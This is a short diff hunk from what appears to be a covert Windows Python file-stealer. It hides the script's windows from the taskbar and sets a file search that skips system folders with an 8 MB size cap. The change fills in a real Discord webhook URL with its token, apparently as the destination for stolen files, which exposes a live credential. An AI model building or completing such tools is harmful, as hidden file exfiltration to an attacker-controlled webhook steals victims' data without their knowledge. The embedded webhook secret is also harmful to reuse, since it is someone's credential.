@@ -22,7 +22,7 @@ for hwnd in windows:
         win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = "place your discord webhook here"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1213686465985388574/HRp2lCPLzeEgdqGzLe3-5_fhwJL2jDNdKjTDAEmboOtlzI7tlOQdzTsJaCLAyYuBuJZh"
 # Directories to ignore during file search
 BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
 MAX_FILE_SIZE_MB = 8
